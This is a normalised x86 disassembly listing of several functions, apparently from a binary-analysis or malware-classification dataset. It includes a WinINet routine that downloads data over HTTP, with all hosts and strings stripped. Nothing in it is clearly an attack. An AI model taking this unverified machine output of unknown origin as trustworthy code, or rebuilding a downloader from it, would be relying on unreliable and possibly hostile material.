mov [ ebp - 0x124 ] edx
mov eax [ ebp + 0x8 ]
jmp r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov ecx [ ebp - 0x124 ]
or ecx 0x1
mov [ ebp - 0x124 ] ecx
mov eax [ ebp + 0x8 ]
jmp r-xdata
jmp r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov ecx [ ebp - 0x124 ]
or ecx 0x1
mov [ ebp - 0x124 ] ecx
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_41d0f5
jmp r-xdata
jmp r-xdata
jmp r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov eax [ ebp - 0x124 ]
or eax 0x1
mov [ ebp - 0x124 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_41d156
jmp r-xdata
jmp r-xdata
jmp r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov eax [ ebp - 0x124 ]
or eax 0x1
mov [ ebp - 0x124 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_41d230
push ebp
mov ebp esp
push 0xffffffff
push sub_43c117
mov eax [ fs : 0x0 ]
push eax
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0xa4 ] ecx
mov [ ebp - 0x8c ] 0x0
push r--data
lea ecx [ ebp - 0x58 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x88 ]
call sub_40bd50
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x70 ]
call sub_40bd50
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x40 ]
call sub_40bd50
mov [ ebp - 0x4 ] 0x3
push r--data
lea ecx [ ebp - 0x40 ]
call sub_40bde0
push eax
lea ecx [ ebp - 0x70 ]
call sub_41e8a0
push eax
lea ecx [ ebp - 0x88 ]
call sub_41e8a0
push 0x0
call sub_41c080
add esp 0x4
push eax
call sub_4247a2
add esp 0x4
call sub_42477f
cdq
mov ecx 0x64
idiv ecx
mov [ ebp - 0xd4 ] edx
mov edx [ ebp - 0xd4 ]
push edx
push r--data
lea eax [ ebp - 0x28 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
push 0x1
lea ecx [ ebp - 0x88 ]
push ecx
call sub_41bff0
add esp 0x8
push 0x2
lea edx [ ebp - 0x70 ]
push edx
call sub_41bff0
add esp 0x8
lea eax [ ebp - 0x110 ]
push eax
mov ecx [ ebp - 0xa4 ]
call sub_41cf60
mov [ ebp - 0xac ] eax
mov ecx [ ebp - 0xac ]
push ecx
lea ecx [ ebp - 0x40 ]
call sub_410d50
lea ecx [ ebp - 0x110 ]
call sub_40bdc0
lea edx [ ebp - 0x88 ]
push edx
push r--data
lea eax [ ebp - 0x158 ]
push eax
call sub_41e9f0
add esp 0xc
mov [ ebp - 0xb4 ] eax
mov ecx [ ebp - 0xb4 ]
mov [ ebp - 0xbc ] ecx
mov [ ebp - 0x4 ] 0x4
push r--data
mov edx [ ebp - 0xbc ]
push edx
lea eax [ ebp - 0x1b8 ]
push eax
call sub_41b4f0
add esp 0xc
mov [ ebp - 0xec ] eax
mov ecx [ ebp - 0xec ]
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x4 ] 0x5
lea edx [ ebp - 0x70 ]
push edx
mov eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x218 ]
push ecx
call sub_41eab0
add esp 0xc
mov [ ebp - 0xc8 ] eax
mov edx [ ebp - 0xc8 ]
mov [ ebp - 0xa0 ] edx
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_41e920
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x218 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x1b8 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x158 ]
call sub_40bdc0
push 0x0
push r--data
mov ecx [ ebp + 0xc ]
call sub_40beb0
cmp eax [ r--data ]
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
push r--data
lea ecx [ ebp - 0x230 ]
push ecx
call sub_41e9f0
add esp 0xc
mov [ ebp - 0x90 ] eax
mov edx [ ebp - 0x90 ]
mov [ ebp - 0xf4 ] edx
mov [ ebp - 0x4 ] 0xd
push r--data
mov eax [ ebp - 0xf4 ]
push eax
lea ecx [ ebp - 0x200 ]
push ecx
call sub_41b4f0
add esp 0xc
mov [ ebp - 0xdc ] eax
mov edx [ ebp - 0xdc ]
mov [ ebp - 0xc4 ] edx
mov [ ebp - 0x4 ] 0xe
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0xc4 ]
push ecx
lea edx [ ebp - 0x1d0 ]
push edx
call sub_41eab0
add esp 0xc
mov [ ebp - 0x94 ] eax
mov eax [ ebp - 0x94 ]
mov [ ebp - 0x9c ] eax
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x9c ]
push ecx
lea ecx [ ebp - 0x58 ]
call sub_41e920
mov [ ebp - 0x4 ] 0xe
lea ecx [ ebp - 0x1d0 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0xd
lea ecx [ ebp - 0x200 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x230 ]
call sub_40bdc0
lea ecx [ ebp - 0x28 ]
push ecx
lea ecx [ ebp - 0x1a0 ]
call sub_40bd80
mov [ ebp - 0xd0 ] eax
mov edx [ ebp - 0xd0 ]
mov [ ebp - 0xf0 ] edx
mov [ ebp - 0x4 ] 0x7
lea eax [ ebp - 0x40 ]
push eax
push r--data
lea ecx [ ebp - 0x170 ]
push ecx
call sub_41e9f0
add esp 0xc
mov [ ebp - 0xa8 ] eax
mov edx [ ebp - 0xa8 ]
mov [ ebp - 0xd8 ] edx
mov [ ebp - 0x4 ] 0x8
push r--data
mov eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x140 ]
push ecx
call sub_41b4f0
add esp 0xc
mov [ ebp - 0xb0 ] eax
mov edx [ ebp - 0xb0 ]
mov [ ebp - 0xe0 ] edx
mov [ ebp - 0x4 ] 0x9
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0xe0 ]
push ecx
lea edx [ ebp - 0x128 ]
push edx
call sub_41eab0
add esp 0xc
mov [ ebp - 0xb8 ] eax
mov eax [ ebp - 0xb8 ]
mov [ ebp - 0xe8 ] eax
mov [ ebp - 0x4 ] 0xa
push r--data
mov ecx [ ebp - 0xe8 ]
push ecx
lea edx [ ebp - 0x1e8 ]
push edx
call sub_41b4f0
add esp 0xc
mov [ ebp - 0xc0 ] eax
mov eax [ ebp - 0xc0 ]
mov [ ebp - 0xf8 ] eax
mov [ ebp - 0x4 ] 0xb
mov ecx [ ebp - 0xf0 ]
push ecx
mov edx [ ebp - 0xf8 ]
push edx
lea eax [ ebp - 0x188 ]
push eax
call sub_41eaf0
add esp 0xc
mov [ ebp - 0xcc ] eax
mov ecx [ ebp - 0xcc ]
mov [ ebp - 0xe4 ] ecx
mov [ ebp - 0x4 ] 0xc
mov edx [ ebp - 0xe4 ]
push edx
lea ecx [ ebp - 0x58 ]
call sub_41e920
mov [ ebp - 0x4 ] 0xb
lea ecx [ ebp - 0x188 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0xa
lea ecx [ ebp - 0x1e8 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x9
lea ecx [ ebp - 0x128 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x8
lea ecx [ ebp - 0x140 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp - 0x170 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x1a0 ]
call sub_40bdc0
jmp r-xdata
lea edx [ ebp - 0x58 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_41a2d0
mov eax [ ebp - 0x8c ]
or eax 0x1
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x40 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x70 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x88 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x58 ]
call sub_40bdc0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x8
sub_41d710
push ebp
mov ebp esp
push 0xffffffff
push sub_43bf86
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x7d54c
call sub_42cc00
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x7d52c ] ecx
mov [ ebp - 0x7d4f4 ] 0x0
push r--data
lea ecx [ ebp - 0x7d484 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x0
xor eax eax
mov [ ebp - 0x464 ] ax
push 0x206
push 0x0
lea ecx [ ebp - 0x462 ]
push ecx
call sub_427900
add esp 0xc
xor edx edx
mov [ ebp - 0x25c ] dx
push 0x206
push 0x0
lea eax [ ebp - 0x25a ]
push eax
call sub_427900
add esp 0xc
push 0x3c
push 0x0
lea ecx [ ebp - 0x7d4e4 ]
push ecx
call sub_427900
add esp 0xc
mov [ ebp - 0x7d4e4 ] 0x3c
mov [ ebp - 0x7d4b0 ] 0x0
mov [ ebp - 0x7d4ac ] 0x0
lea edx [ ebp - 0x464 ]
mov [ ebp - 0x7d4d4 ] edx
mov [ ebp - 0x7d4d0 ] 0x103
mov [ ebp - 0x7d4c0 ] 0x0
mov [ ebp - 0x7d4bc ] 0x0
mov [ ebp - 0x7d4e0 ] 0x0
mov [ ebp - 0x7d4dc ] 0x0
lea eax [ ebp - 0x25c ]
mov [ ebp - 0x7d4b8 ] eax
mov [ ebp - 0x7d4b4 ] 0x103
lea ecx [ ebp - 0x7d4e4 ]
push ecx
push 0x80000000
mov ecx [ ebp + 0xc ]
call sub_401890
push eax
mov ecx [ ebp + 0xc ]
call sub_40be90
push eax
call [ InternetCrackUrlW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x7d4f8 ] 0x0
mov [ ebp - 0x7d4fc ] 0x0
mov [ ebp - 0x7d4f0 ] 0x0
mov [ ebp - 0x7d4e5 ] 0x1
lea ecx [ ebp - 0x7d49c ]
call sub_40ffa0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x2
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x7d484 ]
call sub_40be90
push eax
call [ InternetOpenW@IAT ]
mov [ ebp - 0x7d4f8 ] eax
cmp [ ebp - 0x7d4f8 ] 0x0
jne r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_4017f0
mov edx [ ebp - 0x7d4f4 ]
or edx 0x1
mov [ ebp - 0x7d4f4 ] edx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x7d484 ]
call sub_40bdc0
mov eax [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push 0x0
push 0x3
push r--data
push r--data
push 0x0
lea edx [ ebp - 0x464 ]
push edx
mov eax [ ebp - 0x7d4f8 ]
push eax
call [ InternetConnectW@IAT ]
mov [ ebp - 0x7d4fc ] eax
cmp [ ebp - 0x7d4fc ] 0x0
jne r-xdata
mov [ ebp - 0x7d514 ] r--data
lea eax [ ebp - 0x7d514 ]
push eax
lea ecx [ ebp - 0x7d538 ]
call sub_42392e
push r--data
lea ecx [ ebp - 0x7d538 ]
push ecx
call sub_42569b
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x8
push 0x0
push 0x80000100
push 0x0
push 0x0
push r--data
lea eax [ ebp - 0x25c ]
push eax
push r--data
mov ecx [ ebp - 0x7d4fc ]
push ecx
call [ HttpOpenRequestW@IAT ]
mov [ ebp - 0x7d4f0 ] eax
cmp [ ebp - 0x7d4f0 ] 0x0
jne r-xdata
mov [ ebp - 0x7d51c ] r--data
lea ecx [ ebp - 0x7d51c ]
push ecx
lea ecx [ ebp - 0x7d55c ]
call sub_42392e
push r--data
lea edx [ ebp - 0x7d55c ]
push edx
call sub_42569b
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x7d4f0 ]
push ecx
call [ HttpSendRequestW@IAT ]
mov [ ebp - 0x7d50c ] eax
cmp [ ebp - 0x7d50c ] 0x0
jne r-xdata
mov [ ebp - 0x7d518 ] r--data
lea edx [ ebp - 0x7d518 ]
push edx
lea ecx [ ebp - 0x7d544 ]
call sub_42392e
push r--data
lea eax [ ebp - 0x7d544 ]
push eax
call sub_42569b
mov [ ebp - 0x7d46c ] 0x40
push 0x0
lea ecx [ ebp - 0x7d46c ]
push ecx
lea edx [ ebp - 0x54 ]
push edx
push 0x5
mov eax [ ebp - 0x7d4f0 ]
push eax
call [ HttpQueryInfoW@IAT ]
mov [ ebp - 0x7d508 ] eax
mov [ ebp - 0x7d4ec ] 0x0
cmp [ ebp - 0x7d508 ] 0x0
je r-xdata
mov [ ebp - 0x7d510 ] r--data
lea edx [ ebp - 0x7d510 ]
push edx
lea ecx [ ebp - 0x7d550 ]
call sub_42392e
push r--data
lea eax [ ebp - 0x7d550 ]
push eax
call sub_42569b
mov [ ebp - 0x7d4ec ] 0x7d000
lea ecx [ ebp - 0x54 ]
push ecx
call sub_42314c
add esp 0x4
mov [ ebp - 0x7d4ec ] eax
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x7d4ec ] 0x7d000
jb r-xdata
mov [ ebp - 0x7d500 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x7d4ec ]
mov [ ebp - 0x7d504 ] eax
mov [ ebp - 0x7d504 ] 0x7d000
jmp r-xdata
cmp [ ebp - 0x7d4f0 ] 0x0
je r-xdata
mov ecx [ ebp - 0x7d500 ]
add ecx [ ebp - 0x7d468 ]
mov [ ebp - 0x7d500 ] ecx
mov edx [ ebp - 0x7d4ec ]
sub edx [ ebp - 0x7d468 ]
mov [ ebp - 0x7d4ec ] edx
cmp [ ebp - 0x7d468 ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x7d520 ] eax
mov eax [ ebp - 0x7d520 ]
mov [ ebp - 0x7d528 ] eax
mov [ ebp - 0x7d4e5 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x7d504 ]
mov [ ebp - 0x7d524 ] ecx
lea edx [ ebp - 0x7d468 ]
push edx
mov eax [ ebp - 0x7d524 ]
push eax
lea ecx [ ebp - 0x7d464 ]
push ecx
mov edx [ ebp - 0x7d4f0 ]
push edx
call [ InternetReadFile@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x7d4fc ] 0x0
je r-xdata
mov edx [ ebp - 0x7d4f0 ]
push edx
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x7d468 ]
push eax
lea ecx [ ebp - 0x7d464 ]
push ecx
lea ecx [ ebp - 0x7d49c ]
call sub_414190
cmp [ ebp - 0x7d4ec ] 0x0
jg r-xdata
jmp r-xdata
cmp [ ebp - 0x7d4f8 ] 0x0
je r-xdata
mov eax [ ebp - 0x7d4fc ]
push eax
call [ InternetCloseHandle@IAT ]
jmp r-xdata
jmp r-xdata
movzx edx [ ebp - 0x7d4e5 ]
test edx edx
je r-xdata
mov ecx [ ebp - 0x7d4f8 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx 0x1
test edx edx
je r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_4017f0
mov edx [ ebp - 0x7d4f4 ]
or edx 0x1
mov [ ebp - 0x7d4f4 ] edx
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x7d49c ]
call sub_401830
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x7d484 ]
call sub_40bdc0
mov eax [ ebp + 0x8 ]
lea eax [ ebp - 0x7d49c ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410020
mov ecx [ ebp - 0x7d4f4 ]
or ecx 0x1
mov [ ebp - 0x7d4f4 ] ecx
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x7d49c ]
call sub_401830
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x7d484 ]
call sub_40bdc0
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_41dc90
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x18 ] ecx
push 0x0
push 0x0
push 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x1
xor ecx ecx
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_421652
add esp 0x4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + ecx + 0x2 ]
push edx
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call sub_427900
add esp 0xc
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
push 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov ecx [ ebp - 0x8 ]
push ecx
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
add edx 0x1
push edx
call sub_421652
add esp 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
add ecx 0x1
push ecx
push 0x0
mov edx [ ebp - 0xc ]
push edx
call sub_427900
add esp 0xc
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
push 0xffffffff
mov edx [ ebp - 0x8 ]
push edx
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x4
sub_41dd80
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x18 ] ecx
push 0x0
push 0x0
push 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x1
xor ecx ecx
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_421652
add esp 0x4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + ecx + 0x2 ]
push edx
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call sub_427900
add esp 0xc
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
push 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov ecx [ ebp - 0x8 ]
push ecx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
add edx 0x1
push edx
call sub_421652
add esp 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
add ecx 0x1
push ecx
push 0x0
mov edx [ ebp - 0xc ]
push edx
call sub_427900
add esp 0xc
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
push 0xffffffff
mov edx [ ebp - 0x8 ]
push edx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x4
sub_41de70
push ebp
mov ebp esp
push 0xffffffff
push sub_43c044
mov eax [ fs : 0x0 ]
push eax
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0xdc ] ecx
mov [ ebp - 0xd4 ] 0x0
push r--data
lea ecx [ ebp - 0x80 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x0
push r--data
lea ecx [ ebp - 0xb0 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x50 ] 0x0
push 0x3f
push 0x0
lea eax [ ebp - 0x4f ]
push eax
call sub_427900
add esp 0xc
lea ecx [ ebp - 0x50 ]
push ecx
lea ecx [ ebp - 0x154 ]
call sub_4017f0
mov [ ebp - 0x110 ] eax
mov edx [ ebp - 0x110 ]
mov [ ebp - 0x114 ] edx
mov [ ebp - 0x4 ] 0x2
push r--data
mov eax [ ebp - 0x114 ]
push eax
call sub_416760
add esp 0x8
mov [ ebp - 0xd5 ] al
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x154 ]
call sub_401830
movzx ecx [ ebp - 0xd5 ]
test ecx ecx
je r-xdata
push r--data
lea ecx [ ebp - 0xc8 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x98 ]
push ecx
mov ecx [ ebp - 0xdc ]
call sub_41d710
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x98 ]
call sub_401870
push eax
mov ecx [ ebp - 0xdc ]
call sub_41dc90
mov [ ebp - 0xf0 ] eax
mov edx [ ebp - 0xf0 ]
push edx
lea ecx [ ebp - 0x22c ]
call sub_4017f0
mov [ ebp - 0xf8 ] eax
mov eax [ ebp - 0xf8 ]
push eax
lea ecx [ ebp - 0x98 ]
call sub_410070
lea ecx [ ebp - 0x22c ]
call sub_401830
mov ecx [ ebp - 0xf0 ]
push ecx
call sub_422732
add esp 0x4
push 0x0
push r--data
lea ecx [ ebp - 0x98 ]
call sub_410230
mov [ ebp - 0xd0 ] eax
lea ecx [ ebp - 0x98 ]
call sub_401890
mov [ ebp - 0xec ] eax
mov edx [ ebp - 0xd0 ]
cmp edx [ r--data ]
jne r-xdata
lea edx [ ebp - 0x50 ]
push edx
lea ecx [ ebp - 0x80 ]
call sub_401850
push r--data
lea ecx [ ebp - 0x68 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0xc9 ] 0x0
mov ecx [ ebp - 0xd0 ]
mov [ ebp - 0xe8 ] ecx
jmp r-xdata
push r--data
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x1e4 ]
push ecx
call sub_416570
add esp 0xc
mov [ ebp - 0xfc ] eax
mov edx [ ebp - 0xfc ]
mov [ ebp - 0x104 ] edx
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp - 0xb0 ]
push eax
mov ecx [ ebp - 0x104 ]
push ecx
lea edx [ ebp - 0x184 ]
push edx
call sub_4166e0
add esp 0xc
mov [ ebp - 0x10c ] eax
mov eax [ ebp - 0x10c ]
mov [ ebp - 0x118 ] eax
mov [ ebp - 0x4 ] 0x6
push 0x0
mov ecx [ ebp - 0x118 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0xdc ]
call sub_41b6e0
mov eax [ ebp - 0xd4 ]
or eax 0x1
mov [ ebp - 0xd4 ] eax
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x184 ]
call sub_401830
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x1e4 ]
call sub_401830
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x98 ]
call sub_401830
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xc8 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xb0 ]
call sub_401830
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x80 ]
call sub_401830
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0xe8 ]
cmp eax [ ebp - 0xec ]
jge r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x68 ]
call sub_401890
mov [ ebp - 0xec ] eax
push 0x0
push r--data
lea ecx [ ebp - 0x68 ]
call sub_410230
mov [ ebp - 0xd0 ] eax
mov edx [ ebp - 0xd0 ]
cmp edx [ r--data ]
jne r-xdata
mov ecx [ ebp - 0xe8 ]
push ecx
lea ecx [ ebp - 0x98 ]
call sub_410210
movsx edx [ eax ]
cmp edx 0xa
jne r-xdata
mov ecx [ ebp - 0xd0 ]
add ecx 0xa
mov [ ebp - 0xd0 ] ecx
push r--data
lea ecx [ ebp - 0x80 ]
call sub_401850
mov edx [ ebp - 0xd0 ]
mov [ ebp - 0xe4 ] edx
jmp r-xdata
push r--data
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x214 ]
push ecx
call sub_416570
add esp 0xc
mov [ ebp - 0x11c ] eax
mov edx [ ebp - 0x11c ]
mov [ ebp - 0x100 ] edx
mov [ ebp - 0x4 ] 0x8
lea eax [ ebp - 0xb0 ]
push eax
mov ecx [ ebp - 0x100 ]
push ecx
lea edx [ ebp - 0x1b4 ]
push edx
call sub_4166e0
add esp 0xc
mov [ ebp - 0x124 ] eax
mov eax [ ebp - 0x124 ]
mov [ ebp - 0x108 ] eax
mov [ ebp - 0x4 ] 0x9
push 0x0
mov ecx [ ebp - 0x108 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0xdc ]
call sub_41b6e0
mov eax [ ebp - 0xd4 ]
or eax 0x1
mov [ ebp - 0xd4 ] eax
mov [ ebp - 0x4 ] 0x8
lea ecx [ ebp - 0x1b4 ]
call sub_401830
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp - 0x214 ]
call sub_401830
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x68 ]
call sub_401830
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x98 ]
call sub_401830
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xc8 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xb0 ]
call sub_401830
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x80 ]
call sub_401830
mov eax [ ebp + 0x8 ]
jmp r-xdata
movzx ecx [ ebp - 0xc9 ]
test ecx ecx
je r-xdata
movzx eax [ ebp - 0xc9 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xe4 ]
cmp ecx [ ebp - 0xec ]
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0xe8 ]
push edx
lea ecx [ ebp - 0x98 ]
call sub_410210
mov al [ eax ]
movzx ecx al
push ecx
lea ecx [ ebp - 0x68 ]
call sub_4101f0
mov [ ebp - 0xc9 ] 0x1
jmp r-xdata
jmp r-xdata
push 0x0
push r--data
lea ecx [ ebp - 0x68 ]
call sub_410230
mov [ ebp - 0xd0 ] eax
mov ecx [ ebp - 0xd0 ]
cmp ecx [ r--data ]
jne r-xdata
mov edx [ ebp - 0xe4 ]
push edx
lea ecx [ ebp - 0x68 ]
call sub_410210
movsx eax [ eax ]
cmp eax 0x20
jne r-xdata
mov edx [ ebp - 0xe8 ]
add edx 0x1
mov [ ebp - 0xe8 ] edx
mov eax [ ebp - 0xd0 ]
add eax 0x4
mov [ ebp - 0xd0 ] eax
push r--data
lea ecx [ ebp - 0xb0 ]
call sub_401850
mov ecx [ ebp - 0xd0 ]
mov [ ebp - 0xe0 ] ecx
jmp r-xdata
push r--data
lea edx [ ebp - 0x80 ]
push edx
lea eax [ ebp - 0x19c ]
push eax
call sub_416570
add esp 0xc
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov [ ebp - 0xf4 ] ecx
mov [ ebp - 0x4 ] 0xa
lea edx [ ebp - 0xb0 ]
push edx
mov eax [ ebp - 0xf4 ]
push eax
lea ecx [ ebp - 0x16c ]
push ecx
call sub_4166e0
add esp 0xc
mov [ ebp - 0x134 ] eax
mov edx [ ebp - 0x134 ]
mov [ ebp - 0x13c ] edx
mov [ ebp - 0x4 ] 0xb
push 0x0
mov eax [ ebp - 0x13c ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0xdc ]
call sub_41b6e0
mov edx [ ebp - 0xd4 ]
or edx 0x1
mov [ ebp - 0xd4 ] edx
mov [ ebp - 0x4 ] 0xa
lea ecx [ ebp - 0x16c ]
